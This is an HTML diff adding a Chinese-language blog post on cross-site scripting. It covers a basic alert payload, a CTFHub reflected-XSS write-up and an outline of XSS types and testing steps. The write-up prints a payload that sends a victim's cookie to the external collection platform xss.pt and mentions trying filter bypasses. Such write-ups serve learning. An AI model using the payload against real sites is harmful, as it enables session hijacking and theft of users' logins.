@@ -118,6 +118,73 @@
     
     
     <article
+  id="post-xss"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/11/23/xss/"
+    >xss</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/11/23/xss/" class="article-date">
+  <time datetime="2020-11-23T13:59:21.534Z" itemprop="datePublished">2020-11-23</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>原理好像比较简单，用js来完成。</p>
+<p>直接上代码：</p>
+<p><img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201123220435.png" alt="image-20201123220428498"></p>
+<p><img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201123220757.png" alt="image-20201123220757457"></p>
+<p>当我们输入&lt;script&gt;alert(‘xss’)&lt;/script&gt;将会发生弹窗，这就是基本的原理。</p>
+<h4 id="ctfhub-xss-反射型："><a href="#ctfhub-xss-反射型：" class="headerlink" title="ctfhub xss 反射型："></a>ctfhub xss 反射型：</h4><p>目的 ：得到cookie</p>
+<p>得到题目：</p>
+<p><img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201129005329.png" alt="XSS_Reflex1"></p>
+<!--sbfxf -->
+
+<p>注册一个xss平台 xss platform</p>
+<p><a href="https://xss.pt/xss.php?do=project&amp;act=viewcode&amp;id=17294" target="_blank" rel="noopener">https://xss.pt/xss.php?do=project&amp;act=viewcode&amp;id=17294</a></p>
+<p><img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201129005647.png" alt="image-20201129005647719"></p>
+<p>在sent url to bot 构建 当前url+name=&lt;Img sRC=<a href="https://xss.pt/dQHWp.jpg&gt;" target="_blank" rel="noopener">https://xss.pt/dQHWp.jpg&gt;</a> 即可在平台得到接收内容。</p>
+<p><img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201129011354.png" alt="image-20201129011354708"></p>
+<p>我们对xss已经有了简单的了解。</p>
+<p>xss分为简单的三种：</p>
+<h4 id="一、xss反射型原理："><a href="#一、xss反射型原理：" class="headerlink" title="一、xss反射型原理："></a>一、xss反射型原理：</h4><p>对普通的用户输入，页面原样输出，用户通过对JSCODE的伪装，经过一些操作就会跳出一个木马界面，取得登录用户的Cookie.</p>
+<p>比如说我建立了一个网站，还有一个其他人的网站有xss漏洞，在用户访问漏洞网站后，我就可以诱导用户去点击我的网站，我的网站就可以用javascript利用浏览器去访问漏洞网站，然后让其访问我的服务器，从而得到cookie。</p>
+<h4 id="二、存储型XSS："><a href="#二、存储型XSS：" class="headerlink" title="二、存储型XSS："></a>二、存储型XSS：</h4><p> &lt;持久化&gt;  代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。</p>
+<h4 id="三、跨站脚本漏洞测试流程"><a href="#三、跨站脚本漏洞测试流程" class="headerlink" title="三、跨站脚本漏洞测试流程"></a>三、跨站脚本漏洞测试流程</h4><p> 1.在目标站点上找到输入点，比如查询接口，留言板等<br> 2.输入一组”特殊字符+唯一识别字符”，点击提交后，查看返回源码，是否有做对应的处理。<br> 3.通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合)<br> 4.提交构造的脚本代码以及各种绕过姿势，看是否可以成功执行，如果成功执行则说明存在xss漏洞<br> Tips:<br> 1.一般查询接口容易出现反射型xss,留言板容易出现存储型xss<br> 2.由于后台可能存在过滤措施，构造的script可能会被过滤掉，而无法生效或者环境限制了执行。<br> 3.通过变化不同的script，尝试绕过后台过滤机制。</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+    
+ 
+   
+</article>
+
+    
+    <article
   id="post-ctfshow刷题记录"
   class="article article-type-post"
   itemscope
